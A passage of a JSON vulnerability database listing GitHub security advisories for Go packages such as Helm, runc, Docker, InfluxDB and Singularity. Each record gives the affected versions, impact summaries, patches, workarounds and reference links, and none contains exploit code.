which makes it difficult to intercept valid tokens for replay attacks\n- The expiry time of the JWT gives only a short window of opportunity where it could be replayed\n\n### Patches\n\nThis will be patched with v1.4.0+oryOS.17\n\n### Workarounds\n\nTwo workarounds have been identified:\n\n- Do not allow clients to use `private_key_jwt`\n- Use short expiry times for the JWTs\n\n### References\n\nhttps://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication\n\n### Upstream\n\nThis issue will be resolved in the upstream repository https://github.com/ory/fosite", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ory/hydra"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ory/hydra/security/advisories/GHSA-3p3g-vpw6-4w66"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-5300"}, {"type": "WEB", "url": "https://github.com/ory/hydra/commit/700d17d3b7d507de1b1d459a7261d6fb2571ebe3"}, {"type": "PACKAGE", "url": "https://github.com/ory/hydra"}, {"type": "WEB", "url": "https://github.com/ory/hydra/releases/tag/v1.4.0"}, {"type": "WEB", "url": "https://openid.net/specs/openid-connect-core-1_0.html#ClientAuthentication"}], "database_specific": {"cwe_ids": ["CWE-294"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T21:19:26Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-q8q8-93cv-v6h8", "modified": "2021-05-24T21:15:16Z", "published": "2021-05-27T18:44:56Z", "aliases": ["CVE-2020-11013"], "summary": "Lookup function information discolosure in helm", "details": "The Helm core maintainers have identified an information disclosure vulnerability in Helm 3.0.0-3.1.2. \n\n### Impact\n\n`lookup` is a Helm template function introduced in Helm v3. It is able to lookup resources in the cluster to check for the existence of specific resources and get details about them. This can be used as part of the process to render templates.\n\nThe documented behavior of `helm template` states that it does not attach to a remote cluster. However, as the recently added `lookup` template function circumvents this restriction and connects to the cluster even during `helm template` and `helm install|update|delete|rollback --dry-run`. The user is not notified of this behavior.\n\nRunning `helm template` should not make calls to a cluster. This is different from `install`, which is presumed to have access to a cluster in order to load resources into Kubernetes. Helm 2 is unaffected by this vulnerability.\n\nA malicious chart author could inject a `lookup` into a chart that, when rendered through `helm template`, performs unannounced lookups against the cluster a user's `KUBECONFIG` file points to. This information can then be disclosed via the output of `helm template`.\n\n### Patches\n\nThis issue has been fixed in Helm 3.2.0\n\n### Workarounds\n\nDue to another bug (also fixed in Helm 3.2.0), the command `helm lint` will fail with an error if the `lookup` function is used in a chart. Therefore, run `helm lint` on an untrusted chart before running `helm template`.\n\nAlternately, setting the `KUBECONFIG` environment variable to point to an empty Kubernetes configuration file will prevent unintended network connections.\n\nFinally, a chart may be manually analyzed for the presence of a `lookup` function in any file in the `templates/` directory.  \n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Helm repository](https://github.com/helm/helm/issues)\n* For security-specific issues, email us at [cncf-helm-security@lists.cncf.io](mailto:cncf-helm-security@lists.cncf.io)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.1.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-q8q8-93cv-v6h8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-11013"}, {"type": "WEB", "url": "https://github.com/helm/helm/pull/7969"}, {"type": "WEB", "url": "https://github.com/helm/helm/pull/7969/commits/c67b644a791a8fa61c760a3a0474533e63e74008"}, {"type": "WEB", "url": "https://github.com/helm/helm/releases/tag/v3.2.0"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T21:15:16Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-vj3f-3286-r4pf", "modified": "2021-05-17T21:28:16Z", "published": "2021-05-18T21:09:17Z", "aliases": ["CVE-2014-9356"], "summary": "Path Traversal in Docker", "details": "Path traversal vulnerability in Docker before 1.3.3 allows remote attackers to write to arbitrary files and bypass a container protection mechanism via a full pathname in a symlink in an (1) image or (2) build in a Dockerfile.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/docker/docker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/moby/moby"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9356"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/cve-2014-9356"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1172761"}, {"type": "WEB", "url": "https://groups.google.com/forum/#%21msg/docker-user/nFAz-B-n4Bw/0wr3wvLsnUwJ"}, {"type": "WEB", "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9356"}, {"type": "WEB", "url": "http://www.securityfocus.com/archive/1/archive/1/534215/100/0/threaded"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T21:28:16Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-2rmp-fw5r-j5qv", "modified": "2023-10-02T15:14:38Z", "published": "2021-05-18T18:22:05Z", "aliases": ["CVE-2019-20933"], "summary": "Improper Authentication in InfluxDB", "details": "InfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in `services/httpd/handler.go` because a JWT token may have an empty SharedSecret (aka shared secret).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/influxdata/influxdb"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-20933"}, {"type": "WEB", "url": "https://github.com/influxdata/influxdb/issues/12927"}, {"type": "WEB", "url": "https://github.com/influxdata/influxdb/commit/761b557315ff9c1642cf3b0e5797cd3d983a24c0"}, {"type": "WEB", "url": "https://github.com/influxdata/influxdb/compare/v1.7.5...v1.7.6"}, {"type": "WEB", "url": "https://github.com/ticarpi/jwt_tool/blob/a6ca3e0524a204b5add070bc6874cb4e7e5a9864/jwt_tool.py#L1368"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2020/12/msg00030.html"}, {"type": "PACKAGE", "url": "https://pkg.go.dev/github.com/influxdata/influxdb/services/httpd"}, {"type": "WEB", "url": "https://www.debian.org/security/2021/dsa-4823"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-12T21:55:56Z", "nvd_published_at": "2020-11-19T02:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m6wg-2mwg-4rfq", "modified": "2023-02-14T00:12:15Z", "published": "2021-05-18T15:29:42Z", "aliases": ["CVE-2020-8945"], "summary": "GPGME Go wrapper contains Use After Free", "details": "The proglottis Go wrapper before 0.1.1 for the GPGME library has a use-after-free, as demonstrated by use for container image pulls by Docker or CRI-O. This leads to a crash or potential code execution during GPG signature verification.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/proglottis/gpgme"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.1.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8945"}, {"type": "WEB", "url": "https://github.com/proglottis/gpgme/pull/23"}, {"type": "WEB", "url": "https://github.com/containers/image/commit/4c7a23f82ef09127b0ff28366d1cf31316dd6cc1"}, {"type": "WEB", "url": "https://github.com/proglottis/gpgme/commit/92153bcb59bd2f511e502262c46c7bd660e21733"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0679"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0689"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0697"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1795838"}, {"type": "PACKAGE", "url": "https://github.com/proglottis/gpgme"}, {"type": "WEB", "url": "https://github.com/proglottis/gpgme/compare/v0.1.0...v0.1.1"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3SOCLOPTSYABTE4CLTSPDIFE6ZZZR4LX/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/H6P6SSNKN4H6GSEVROHBDXA64PX7EOED/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KDBT77KV3U7BESJX3P4S4MPVDGRTAQA2/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WXV7NZELYWRRCXATXU3FYD3G3WJT3WYM/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0096"}], "database_specific": {"cwe_ids": ["CWE-416"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T22:00:21Z", "nvd_published_at": "2020-02-12T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qr2j-wrhx-4829", "modified": "2023-10-02T11:49:01Z", "published": "2021-05-18T18:38:06Z", "aliases": ["CVE-2018-16733"], "summary": "Go Ethereum Improper Input Validation", "details": "In Go Ethereum (aka geth) before 1.8.14, TraceChain in eth/api_tracer.go does not verify that the end block is after the start block.\n\n### Specific Go Packages Affected\ngithub.com/ethereum/go-ethereum/eth", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.14"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-16733"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/commit/106d196ec4a6451efedc60ab15957f231fa85639"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-12T18:10:24Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-wmwp-pggc-h4mj", "modified": "2023-02-07T21:20:12Z", "published": "2021-05-18T15:30:30Z", "aliases": ["CVE-2019-19619"], "summary": "Cross-site Scripting in Documize", "details": "domain/section/markdown/markdown.go in Documize before 3.5.1 mishandles untrusted Markdown content. This was addressed by adding the bluemonday HTML sanitizer to defend against XSS.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/documize/community"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.5.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-19619"}, {"type": "WEB", "url": "https://github.com/documize/community/commit/a4384210d4d0d6b18e6fdb7e155de96d4a1cf9f3"}, {"type": "PACKAGE", "url": "https://github.com/documize/community"}, {"type": "WEB", "url": "https://github.com/documize/community/compare/v3.5.0...v3.5.1"}, {"type": "WEB", "url": "https://github.com/documize/community/releases/tag/v3.5.1"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0086"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-17T21:29:00Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5684-g483-2249", "modified": "2021-10-05T17:07:09Z", "published": "2021-05-24T16:59:47Z", "aliases": [], "summary": "Signature Validation Bypass", "details": "### Impact\nGiven a valid SAML Response, an attacker can potentially modify the document, bypassing signature validation in order to pass off the altered document as a signed one.\n\nThis enables a variety of attacks, including users accessing accounts other than the one to which they authenticated in the identity provider, or full authentication bypass if an external attacker can obtain an expired, signed SAML Response.\n\n### Patches\nA patch is available, users of gosaml2 should upgrade to v0.5.0 or higher.\n\n### References\nSee the [underlying advisory on goxmldsig](https://github.com/russellhaering/goxmldsig/security/advisories/GHSA-q547-gmf8-8jr7) for more details.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/russellhaering/gosaml2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/russellhaering/gosaml2/security/advisories/GHSA-5684-g483-2249"}, {"type": "PACKAGE", "url": "https://github.com/russellhaering/gosaml2"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-21T22:17:56Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-9h63-7qf6-mv6r", "modified": "2021-05-07T22:01:02Z", "published": "2021-05-18T18:33:12Z", "aliases": ["CVE-2021-20188"], "summary": "Improper Authorization in github.com/containers/libpod", "details": "A flaw was found in podman before 1.7.0. File permissions for non-root users running in a privileged container are not correctly checked. This flaw can be abused by a low-privileged user inside the container to access any other file in the container, even if owned by the root user inside the container. It does not allow to directly escape the container, though being a privileged container means that a lot of security features are disabled when running the container. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/libpod"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-20188"}, {"type": "WEB", "url": "https://github.com/containers/podman/commit/2c7b579fe7328dc6db48bdaf60d0ddd9136b1e24"}, {"type": "WEB", "url": "https://github.com/containers/podman/commit/c8bd4746151e6ae37d49c4688f2f64e03db429fc"}, {"type": "WEB", "url": "https://github.com/containers/podman/commit/dcf3c742b1ac4d641d66810113f3d17441a412f4"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1915734"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-07T22:01:02Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-q6cj-6jvq-jwmh", "modified": "2021-05-04T21:59:38Z", "published": "2021-05-18T18:27:28Z", "aliases": ["CVE-2019-19023"], "summary": "Privilege Escalation in Cloud Native Computing Foundation Harbor", "details": "Cloud Native Computing Foundation Harbor prior to 1.8.6 and 1.9.3 has a Privilege Escalation Vulnerability in the VMware Harbor Container Registry for the Pivotal Platform.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.0"}, {"fixed": "1.8.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.0"}, {"fixed": "1.9.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-3868-7c5x-4827"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-19023"}, {"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories"}, {"type": "WEB", "url": "https://tanzu.vmware.com/security/cve-2019-19023"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-04T21:59:38Z", "nvd_published_at": "2020-03-20T03:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3xh2-74w9-5vxm", "modified": "2023-02-09T19:37:02Z", "published": "2021-05-18T21:08:02Z", "aliases": ["CVE-2020-27813"], "summary": "Integer overflow in github.com/gorilla/websocket", "details": "An integer overflow vulnerability exists with the length of websocket frames received via a websocket connection. An attacker would use this flaw to cause a denial of service attack on an HTTP Server allowing websocket connections.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gorilla/websocket"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gorilla/websocket/security/advisories/GHSA-jf24-p9p9-4rjh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-27813"}, {"type": "WEB", "url": "https://github.com/gorilla/websocket/pull/537"}, {"type": "WEB", "url": "https://github.com/gorilla/websocket/commit/5b740c29263eb386f33f265561c8262522f19d37"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1902111"}, {"type": "PACKAGE", "url": "https://github.com/gorilla/websocket"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2021/01/msg00008.html"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0019"}], "database_specific": {"cwe_ids": ["CWE-190", "CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-18T20:56:17Z", "nvd_published_at": "2020-12-02T01:15:12Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9vp5-m38w-j776", "modified": "2023-10-02T12:24:31Z", "published": "2021-05-24T16:56:58Z", "aliases": ["CVE-2020-15184"], "summary": "Aliases are never checked in helm", "details": "### Impact\n\nDuring a security audit of Helm's code base, security researchers at Trail of Bits identified a bug in which the `alias` field on a `Chart.yaml` is not properly sanitized. This could lead to the injection of unwanted information into a chart.\n\n### Patches\n\nThis issue has been patched in Helm 3.3.2 and 2.16.11\n\n### Specific Go Packages Affected\nhelm.sh/helm/v3/pkg/chartutil\n\n### Workarounds\n\nManually review the `dependencies` field of any untrusted chart, verifying that the `alias` field is either not used, or (if used) does not contain newlines or path characters.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.3.2"}]}]}, {"package": {"ecosystem": "Go", "name": "helm.sh/helm"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.16.11"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-9vp5-m38w-j776"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15184"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/6aab63765f99050b115f0aec3d6350c85e8da946"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/e7c281564d8306e1dcf8023d97f972449ad74850"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-74"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-24T16:50:04Z", "nvd_published_at": "2020-09-17T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g54h-m393-cpwq", "modified": "2021-05-24T20:46:53Z", "published": "2021-12-20T18:21:54Z", "aliases": [], "summary": "devices resource list treated as a blacklist by default", "details": "### Impact\nContrary to the [OCI runtime specification](https://github.com/opencontainers/runtime-spec/blob/v1.0.2/config-linux.md#device-whitelist), `runc`'s implementation of the `linux.resources.devices` list was a black-list by default. This means that users who created their own `config.json` objects and didn't prefix a deny-all rule (`{\"allow\": false, \"permissions\": \"rwm\"}` or equivalent) were not provided protection by the `devices` cgroup. This would allow malicious containers (with sufficient privileges) to create arbitrary device inodes (assuming they have `CAP_MKNOD`) and operate on any device inodes they may have access to (assuming they have regular Unix DAC permissions).\n\nHowever, most (if not all) programs that make use of `runc` include this deny-all rule. This was most likely added before the specification mandated a white-list of devices, and the fact that all programs wrote their own deny-all rule obscured the existence of this bug for several years. In fact, even the specification's examples include a default deny-all rule! We therefore believe that while this is a security bug (and has been fixed as such), it was almost certainly not exploitable in the wild due to the inclusion of default deny-all rules by all known users of `runc` -- hence why this advisory has low severity.\n\n### Patches\nThis issue has been fixed in [a patch that was part of a larger rework of the devices cgroup code in runc](https://github.com/opencontainers/runc/pull/2391) -- which lead to the discovery of this security bug. Users should upgrade to 1.0.0-rc91 as soon as it is released, or wait for your distribution to backport the relevant fixes.\n\n### Workarounds\nIf you are using `runc` directly, ensure that there is a deny-all entry at the beginning of `linux.resources.devices` -- such an entry would look like `{\"allow\": false, \"permissions\": \"rwm\"}` (all other fields are ignored, though `type` must be set to `\"a\"` or `null` if it is present).\n\nUsers which consume `runc` through another program should check whether their containers are operating under a white-list -- this can be done by reading `/sys/fs/cgroup/devices/devices.list` inside the container. If the file contains only the entry `a *:* rwm` (meaning the cgroup is in black-list mode, which likely means \"allow all device access\") then your containers are vulnerable to this issue.\n\nAs always, we recommend **in the strongest possible terms** that all of our users enable user namespaces on all of their workloads (or pressure their vendors to do so). User namespaces are one of the most significant defense-in-depth protections you can enable for containers, and have prevented many container-related vulnerabilities (both kernel 0days as well as bugs in container runtimes, such as this one).\n\n### References\n* https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v1/devices.html\n* [opencontainers/runtime-spec/config-linux.md#device-whitelist](https://github.com/opencontainers/runtime-spec/blob/v1.0.2/config-linux.md#device-whitelist)\n* https://github.com/opencontainers/runc/pull/2391\n\n### For more information\nIf you have any questions or comments about this advisory:\n* [Open an issue in this repo](https://github.com/opencontainers/runc/issues/new).\n* Email us at <security@opencontainers.org>.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/runc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0-rc91"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.0.0-rc90"}}], "references": [{"type": "WEB", "url": "https://github.com/opencontainers/runc/security/advisories/GHSA-g54h-m393-cpwq"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-24T20:46:53Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-pmfr-63c2-jr5c", "modified": "2023-01-20T22:02:58Z", "published": "2021-12-20T18:24:30Z", "aliases": ["CVE-2020-13845"], "summary": "Execution Control List (ECL) Is Insecure in Singularity", "details": "### Impact\n\nThe Singularity Execution Control List (ECL) allows system administrators to set up a policy that defines rules about what signature(s) must be (or must not be) present on a SIF container image for it to be permitted to run.\n\nIn Singularity 3.x versions below 3.6.0, the following issues allow the ECL to be bypassed by a malicious user:\n\n * Image integrity is not validated when an ECL policy is enforced.\n * The fingerprint required by the ECL is compared against the signature object descriptor(s) in the SIF file, rather than to a cryptographically validated signature. Thus, it is trivial to craft an arbitrary payload which will be permitted to run, even if the attacker does not have access to the private key associated with the fingerprint(s) configured in the ECL.\n\n### Patches\n\nThese issues are addressed in Singularity 3.6.0.\n\nAll users are advised to upgrade to 3.6.0. Note that Singularity 3.6.0 uses a new signature format that is necessarily incompatible with Singularity < 3.6.0 - e.g. Singularity 3.5.3 cannot verify containers signed by 3.6.0.\n\nVersion 3.6.0 includes a `legacyinsecure` option that can be set to `legacyinsecure = true` in `ecl.toml` to allow the ECL to perform verification of the older, and insecure, legacy signatures for compatibility with existing containers. This does not guarantee that containers have not been modified since signing, due to other issues in the legacy signature format. The option should be used only to temporarily ease the transition to containers signed with the new 3.6.0 signature format.\n\n### Workarounds\n\nThis issue affects any installation of Singularity configured to use the Execution Control List (ECL) functionality. There is no workaround if ECL is required.\n\n### For more information\n\nGeneral questions about the impact of the advisory / changes made in the 3.6.0 release can be asked in the:\n\n* [Singularity Slack Channel](https://bit.ly/2m0g3lX)\n* [Singularity Mailing List](https://groups.google.com/a/lbl.gov/forum/??sdf%7Csort:date#!forum/singularity)\n\nAny sensitive security concerns should be directed to: security@sylabs.io\n\nSee our Security Policy here: https://sylabs.io/security-policy", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sylabs/singularity"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.6.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hpcng/singularity/security/advisories/GHSA-pmfr-63c2-jr5c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-13845"}, {"type": "WEB", "url": "https://medium.com/sylabs"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00046.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00059.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00053.html"}], "database_specific": {"cwe_ids": ["CWE-347", "CWE-354"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T19:13:13Z", "nvd_published_at": "2020-07-14T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v95c-p5hm-xq8f", "modified": "2023-08-29T22:55:54Z", "published": "2021-12-07T21:22:39Z", "aliases": ["CVE-2021-43784"], "summary": "Overflow in netlink bytemsg length field allows attacker to override netlink-based container configuration in RunC", "details": "### Impact\n\nIn runc, [netlink](https://www.man7.org/linux/man-pages/man7/netlink.7.html) is used internally as a serialization system for specifying the relevant container configuration to the C portion of our code (responsible for the based namespace setup of containers). In all versions of runc prior to 1.0.3, the encoder did not handle the possibility of an integer overflow in the 16-bit length field for the byte array attribute type, meaning that a large enough malicious byte array attribute could result in the length overflowing and the attribute contents being parsed as netlink messages for container configuration.\n\nThis vulnerability requires the attacker to have some control over the configuration of the container and would allow the attacker to bypass the namespace restrictions of the container by simply adding their own netlink payload which disables all namespaces.\n\nPrior to 9c444070ec7bb83995dbc0185da68284da71c554, in practice it was fairly difficult to specify an arbitrary-length netlink message with most container runtimes. The only user-controlled byte array was the namespace paths attributes which can be specified in runc's `config.json`, but as far as we can tell no container runtime gives raw access to that configuration setting -- and having raw access to that setting **would allow the attacker to disable namespace protections entirely anyway** (setting them to `/proc/1/ns/...` for instance). In addition, each namespace path is limited to 4096 bytes (with only 7 namespaces supported by runc at the moment) meaning that even with custom namespace paths it appears an attacker still cannot shove enough bytes into the netlink bytemsg in order to overflow the uint16 counter.\n\nHowever, out of an abundance of caution (given how old this bug is) we decided to treat it as a potentially exploitable vulnerability with a low severity. After 9c444070ec7bb83995dbc0185da68284da71c554 (which was not present in any release of runc prior to the discovery of this bug), all mount paths are included as a giant netlink message which means that this bug becomes significantly more exploitable in more reasonable threat scenarios.\n\nThe main users impacted are those who allow untrusted images with untrusted configurations to run on their machines (such as with shared cloud infrastructure), though as mentioned above it appears this bug was not practically exploitable on any released version of runc to date.\n\n### Patches\nThe patch for this is d72d057ba794164c3cce9451a00b72a78b25e1ae and runc 1.0.3 was released with this bug fixed.\n\n### Workarounds\nTo the extent this is exploitable, disallowing untrusted namespace paths in container configuration should eliminate all practical ways of exploiting this bug. It should be noted that untrusted namespace paths would allow the attacker to disable namespace protections entirely even in the absence of this bug.\n\n### References\n* commit d72d057ba794 (\"runc init: avoid netlink message length overflows\")\n* https://bugs.chromium.org/p/project-zero/issues/detail?id=2241\n\n### Credits\nThanks to Felix Wilhelm from Google Project Zero for discovering and reporting this vulnerability. In particular, the fact they found this vulnerability so quickly, before we made a 1.1 release of runc (which would've been vulnerable) was quite impressive.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [our repo](https://github.com/opencontainers/runc)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/runc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/opencontainers/runc/security/advisories/GHSA-v95c-p5hm-xq8f"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-43784"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/commit/9c444070ec7bb83995dbc0185da68284da71c554"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/commit/d72d057ba794164c3cce9451a00b72a78b25e1ae"}, {"type": "WEB", "url": 